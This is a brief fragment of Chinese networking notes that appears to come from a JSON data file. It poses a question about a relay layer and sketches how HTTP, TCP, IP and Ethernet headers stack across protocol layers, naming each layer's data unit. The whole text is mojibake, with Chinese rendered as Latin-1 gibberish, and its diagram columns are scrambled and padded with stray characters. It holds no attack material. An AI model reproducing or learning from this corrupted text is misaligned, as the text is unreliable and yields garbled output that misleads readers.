ä¸­ç»§å±‚ï¼šå»¶é•¿biteåœ¨ç½‘ç»œä¼ è¾“è·ç¦»é€æ˜æ€§ï¼Ÿ            [å‰å¯¼ç ]      [ETH]      [HTTP]      [TCP]      [IP]      [ETH]                  [ç‰©ç†å±‚]      [æ•°æ®é“¾è·¯å±‚]      [åº”ç”¨å±‚]      [è¿è¾“å±‚]      [ç½‘ç»œå±‚]      [æ•°æ®é“¾è·¯å±‚]              Â       Â       HTTPæŠ¥æ–‡      Â       Â       Â               Â       Â       Â       TCPæŠ¥æ–‡æ®µ      Â       Â               Â       Â       Â       Â       IPæ•°æ®æŠ¥      Â               Â       å¸§      Â       Â       Â       Â               å­—èŠ‚æµ      Â       Â       Â       Â       Â       "
  }
  
]

